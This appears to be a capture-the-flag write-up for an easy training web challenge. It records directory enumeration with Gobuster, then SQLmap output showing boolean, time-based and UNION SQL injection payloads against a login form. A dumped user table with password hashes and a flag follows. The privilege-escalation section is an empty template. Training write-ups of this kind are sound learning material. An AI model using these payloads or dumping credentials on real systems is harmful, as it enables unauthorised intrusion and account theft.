---
tags:
  - 🚩
up:
  - "[[02 - Data Exfiltration (incomplete)]]"
platform: BKSec Training
difficulty: Easy
creation_date: 2026-02-08
last_modified: 2026-02-08
---

# 🚩 [[BKSEC - Low Effort SNS]]
**Primary:** [[01 - Web Security]]

**Secondary:** [[02 - Data Exfiltration (incomplete)]]

**Related Techniques:** [[SQL Injection (incomplete)]]

**Related Tools:** [[SQLmap (incomplete)] [[Gobuster (incomplete)]]

## Executive Summary
* **URL:** `http://103.77.175.40:8021`
* **Key Technique:** SQL injection into credential exfiltration
* **Status:** `Completed`

---

## Reconnaissance
### Web Enumeration
First look around the website, I saw the pages were served  using `PHP`, therefore I tried enumerating pages using `Gobuster` with the `-x php` option.
```bash
gobuster dir --url http://103.77.175.40:8021 --wordlist ~/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x php

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://103.77.175.40:8021
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/login.php            (Status: 200) [Size: 1037]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/index.php            (Status: 200) [Size: 1521]
/signup.php           (Status: 200) [Size: 1544]
/server-status        (Status: 403) [Size: 280]
```

I checked the pages out and look around the website. It seems like the status of action we do will be reflected to us through the URL with either.

![[Pasted image 20260208104705.png]]

![[Pasted image 20260208105516.png]]

Checking out the `login.php`, whenever I tried an pair of credentials, the input are sent to `login_check.php` endpoint.

Other than these two functions (sign up and login) the page does not have any other completed surfaces, so I suspect this might be an SQL injection challenge.

---

## Data Exfiltration
Based on the previous assumption, I fired up `Burpsuite` and copied the request to `login_check.php` and use `SQLmap` to quickly identify the **SQLi vulnerability** and enumerate then dump the database.

**Identify the databases:**
```bash
sqlmap -r request.txt -dbs

[...]
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=hello' AND 9961=9961 AND 'iVNU'='iVNU&password=12345678

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=hello' AND (SELECT 4899 FROM (SELECT(SLEEP(5)))BkhE) AND 'EIUD'='EIUD&password=12345678

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: uname=-6066' UNION ALL SELECT 36,CONCAT(0x716b6b7871,0x46727377506a6744484f4a5265467a4d6a785544734571704b6c4c57704873645875716f6a585075,0x71706b7171),36,36-- -&password=12345678
---
[10:59:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.0.30, Apache 2.4.56
back-end DBMS: MySQL >= 5.0.12
[10:59:23] [INFO] fetching database names
available databases [6]:
[*] BKSEC_TRAINING
[*] information_schema
[*] mysql
[*] MYSQL_DATABASE
[*] performance_schema
[*] sys
```

**Dump the suspicious database:**
```bash
---
cssclasses: code-nowrap
---

sqlmap -r request.txt -D BKSEC_TRAINING --dump --batch

Database: BKSEC_TRAINING                                                                                                                                                                                                                  
Table: user_info
[31 entries]
+----+--------------------------------------------------+--------------------------+----------------------------------------------------------------+
| id | pwd                                              | uname                    | name                                                           |
+----+--------------------------------------------------+--------------------------+----------------------------------------------------------------+
| 1  | 521b04082eb661f55a5152dfdfce3844                 | teebow1e                 | BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1} |
| 2  | 8a7148dfee42902f881086ce7249dd2b (slop)          | slop                     | slop                                                           |
| 3  | 21232f297a57a5a743894a0e4a801fc3 (admin)         | admin                    | admin                                                          |
| 4  | 327a6c4304ad5938eaf0efb6cc3e53dc (flag)          | flag                     | flag                                                           |
```

---

## Privilege Escalation (Root)

**Current User:** `www-data`

### Enumeration

- **LinPeas Findings:** `Vulnerable Sudo version`
    

### Exploitation

Bash

```
# Commands to get root
```

---

## Loot & Flags

- [ ] **User Flag:** `hash_here`
    
- [ ] **Root Flag:** `hash_here`
    
- [ ] **Credentials:**
    
    - `user:password`
        

---

**References:** [Link](https://www.google.com/search?q=url)